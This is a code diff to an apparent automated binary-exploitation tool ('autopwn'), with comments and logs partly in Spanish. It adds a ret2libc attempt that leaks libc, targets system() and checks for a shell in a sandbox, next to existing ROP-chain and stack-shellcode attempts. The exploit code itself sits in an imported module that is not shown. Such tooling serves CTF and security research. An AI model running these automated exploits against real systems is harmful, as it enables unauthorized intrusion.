@@ -122,6 +122,20 @@ def autopwn(binary: str, config=None, store=None,
       except Exception as e:
         res.attempts.append(("rop-chain", False, str(e)))
 
+    # combo B2: ret2libc with leak (dynamic binaries), verified by getting a shell
+    if want("ret2libc"):
+        log("[combo] ret2libc con leak (fuga libc -> system, sandbox)...")
+        try:
+            from .autolibc import autolibc
+            rl = autolibc(binary)
+            verdict = True if rl.get("verified") else (None if rl.get("ok") else False)
+            res.attempts.append(("ret2libc", verdict, rl.get("detail") or rl.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rl.get("verified"))
+            log(f"[combo] ret2libc -> {'SHELL VERIFICADA' if rl.get('verified') else 'no aplicable/verificable'}")
+            learn(f"ret2libc verified={rl.get('verified')} {rl.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("ret2libc", False, str(e)))
+
     # combo C: stack shellcode if NX is off
     if want("shellcode-stack") and str(mit.get("nx", "")).lower() in ("false", "0", "nx_off"):
         res.attempts.append(("shellcode-stack", True, "NX desactivado -> shellcode en stack viable"))
